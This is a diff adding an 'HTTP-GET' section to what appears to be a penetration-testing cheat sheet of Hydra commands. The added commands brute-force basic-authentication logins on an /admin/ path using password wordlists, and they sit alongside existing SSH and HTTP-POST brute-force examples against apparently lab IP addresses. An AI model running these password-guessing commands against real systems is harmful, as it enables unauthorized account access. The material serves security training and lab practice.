@@ -57,6 +57,15 @@ hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-
 hydra -t 16 -l sam -P /usr/share/wordlists/rockyou.txt 10.10.80.187 ssh -s 4567 -vV
 ```
 
+### HTTP-GET
+
+* Basic Authentication HTTP-GET
+
+```
+hydra -vV -l administrator -P 2023-200_most_used_passwords.txt 10.13.38.11 http-get /admin/ 
+hydra -vV -t 2 -l administrator -P /usr/share/seclists/Passwords/seasons.txt 10.13.38.11 http-get /admin/
+```
+
 ## Example Syntax
 
 ```
